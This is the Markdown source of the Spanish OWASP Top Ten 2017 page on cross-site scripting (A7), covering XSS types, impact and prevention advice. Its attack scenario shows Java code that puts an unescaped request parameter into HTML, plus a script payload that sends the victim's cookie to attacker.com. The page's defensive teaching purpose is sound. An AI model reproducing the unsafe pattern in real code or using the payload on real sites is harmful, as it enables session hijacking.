---

document: OWASP Top Ten 2017 (es)
year: 2017
order: 13
en: A7:2017-Cross-Site Scripting (XSS)
title: A7:2017-Secuencias de Comandos en Sitios Cruzados (XSS)
lang: es
layout: full-width-document
author:
contributors: vtamara
tags: OWASP Top Ten 2017 (es), Top Ten, A7:2017, xss, es
exploitability: 3
prevalence: 3
detectability: 3
technical: 2
redirect_from:
  - 2017/es/A7-Cross-Site_Scripting_(XSS)

---

{% include risk_begin.html %}
{%- include risk_description.html pos="firstLeft" -%}

Existen herramientas automatizadas que permiten detectar y explotar las
tres formas de XSS, y también se encuentran disponibles kits de
explotación gratuitos.

{%- include risk_description.html pos="mid" -%}

XSS es la segunda vulnerabilidad más frecuente en OWASP Top 10, 
y se encuentra en alrededor de dos tercios de todas las aplicaciones.<br>
Las herramientas automatizadas pueden detectar algunos problemas XSS 
en forma automática, particularmente en tecnologías maduras como PHP,
J2EE / JSP, y ASP.NET.

{%- include risk_description.html pos="right" -%}

El impacto de XSS es moderado para el caso de XSS Reflejado y XSS en
DOM, y severa para XSS Almacenado, que permite ejecutar
secuencias de comandos en el navegador de la víctima, para robar
credenciales, secuestrar sesiones, o la instalación de software malicioso
en el equipo de la víctima.

{%- include risk_end.html -%}

{%- include t10_subsection_begin.html -%}
{%- include t10_subsection.html token="isTheApplicationVulnerable" pos="firstLeft" -%}

Existen tres formas usuales de XSS para atacar a los navegadores de
los usuarios<br>
* **XSS Reflejado**: la aplicación o API utiliza datos sin validar,
suministrados por un usuario y codificados como parte del HTML o
Javascript de salida. No existe una cabecera que establezca la
[Política de Seguridad de Contenido (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP). 
Un ataque exitoso permite al atacante ejecutar comandos arbitrarios (HTML y
Javascript) en el navegador de la víctima. Típicamente el usuario
deberá interactuar con un enlace, o alguna otra página controlada
por el atacante, como un 
[ataque de abrevadero](https://es.wikipedia.org/wiki/Ataque_de_abrevadero), 
publicidad maliciosa, o similar.<br>
* **XSS Almacenado**: la aplicación o API almacena datos
proporcionados por el usuario sin validar ni sanear, los cuales
posteriormente son visualizados o utilizados por otro usuario o un
administrador. Usualmente es considerado como de riesgo de nivel
alto o crítico.<br>
* **XSS Basados en DOM**: los marcos de trabajo en JavaScript, aplicaciones de
página única o APIs incluyen datos dinámicamente, controlables
por un atacante. Idealmente, se debe evitar procesar datos
controlables por el atacante en APIs no seguras.<br>

Los ataques XSS incluyen el robo de la sesión, apropiación de la
cuenta, evasión de autentificación de múltiples pasos, reemplazo de
nodos DOM, inclusión de troyanos de autentificación, ataques contra el
navegador, descarga de software malicioso, registradores de teclas 
(_keyloggers_), y otros tipos de ataques al lado cliente.<br>


{%- include t10_subsection.html token="howToPrevent" pos="right" -%}

Prevenir XSS requiere mantener los datos no confiables
separados del contenido activo del navegador.<br>
* Utilizar marcos de trabajo seguros que, por diseño, automáticamente
codifican el contenido para prevenir XSS, como en Ruby on Rails o
React JS. Conozca la limitación de  la protección XSS de cada marco de 
y maneje de forma adecuada los casos de usos no cubiertos.<br>
* Escapar datos de requerimientos HTTP no confiables con base en el contexto,
en la salida HTML (cuerpo, atributos, JavaScript,
CSS, o URL), para resolver vulnerabilidades de
XSS Reflejado y XSS Almacenado. 
La [hoja de trucos OWASP para prevenir XSS'](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
tiene detalles sobre las técnicas para escapar requeridas.<br>
* Aplicar codificación sensitiva al contexto, cuando se modifica
el documento en el navegador del cliente, ayuda a prevenir
DOM XSS. Cuando no se puede evitar, se pueden aplicar técnicas para 
escpar sensitivas al contexto para la API del navegador como se describe en
[la hoja de trucos OWASP para evitar XSS DOM](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html).<br>
* Habilitar una [Política de Seguridad de Contenido (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
es una defensa profunda para la mitigación de vulnerabilidades
XSS. Es efectiva si no hay otras vulnerabilidades que
permitan colocar código malicioso vía inclusión de archivos
(e.g vulnerabilidad de [cruce de directorio](https://es.wikipedia.org/wiki/Directory_traversal) que sobreescriba, o librerías vulnerables
provenientes de Redes de Distribución de Contenidos (CDN)).<br>

{%- include t10_subsection.html token="exampleAttackScenarios" pos="left" -%}

**Escenario 1**: la aplicación utiliza datos no confiables en la
construcción del código HTML sin validarlos ni escapar:<br>
    {% include code_red_begin.html -%} (String) page += "<input name='creditcard' type='TEXT' {%- include code_red_end.html %}
    {% include code_red_begin.html -%} value='" + request.getParameter("CC") + "'>"; {%- include code_red_end.html %}


El atacante modifica el parámetro “CC” en el navegador por:<br>
    {% include code_red_begin.html -%} '>&lt;script>document.location= {%- include code_red_end.html %}
    {% include code_red_begin.html -%} 'http://www.attacker.com/cgi-bin/cookie.cgi? {%- include code_red_end.html %}
    {% include code_red_begin.html -%} foo='+document.cookie&lt;/script>'. {%- include code_red_end.html %}


Este ataque causa que el identificador de sesión de la víctima
sea enviado al sitio web del atacante, permitiéndole secuestrar
la sesión actual del usuario.
**Nota**: los atacantes también pueden utilizar XSS para anular
cualquier defensa contra Falsificación de Peticiones en Sitios
Cruzados (CSRF) que la aplicación pueda utilizar.

{%- include t10_subsection.html token="references" pos="right" -%}
**OWASP**<br>
* [OWASP Proactive Controls: Encode and Escape Data](/www-project-proactive-controls/v3/en/c4-encode-escape-data)<br>
* [OWASP Proactive Controls: Validate All Inputs](/www-project-proactive-controls/v3/en/c5-validate-inputs)<br>
* [OWASP Application Security Verification Standard: V5](/www-project-application-security-verification-standard)<br>
* [OWASP Testing Guide: Testing for Reflected XSS](/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting)<br>
* [OWASP Testing Guide: Testing for Stored XSS](/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting)<br>
* [OWASP Testing Guide: Testing for DOM XSS](/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client_Side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting)<br>
* [OWASP Cheat Sheet: XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)<br>
* [OWASP Cheat Sheet: DOM based XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)<br>
* [OWASP Cheat Sheet: XSS Filter Evasion](/www-community//xss-filter-evasion-cheatsheet)<br>
* [OWASP Java Encoder Project](/www-project-java-encoder) ([old wiki](https://wiki.owasp.org/index.php/OWASP_Java_Encoder_Project))<br>
<br>
**Externos**<br>
* [CWE-79: Improper neutralization of user supplied input](https://cwe.mitre.org/data/definitions/79.html)<br>
* [PortSwigger: Client-side template injection](https://portswigger.net/kb/issues/00200308_clientsidetemplateinjection)
{% include t10_subsection_end.html %}
